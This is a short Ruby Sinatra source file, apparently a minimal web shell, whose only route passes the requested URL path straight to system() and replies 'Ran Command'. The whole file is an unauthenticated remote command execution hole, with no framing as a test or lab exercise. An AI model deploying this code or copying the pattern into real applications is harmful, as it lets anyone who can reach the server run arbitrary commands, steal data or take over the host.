require 'sinatra'

get '/:command' do
  system "#{params['command']}"
  "Ran Command"
end
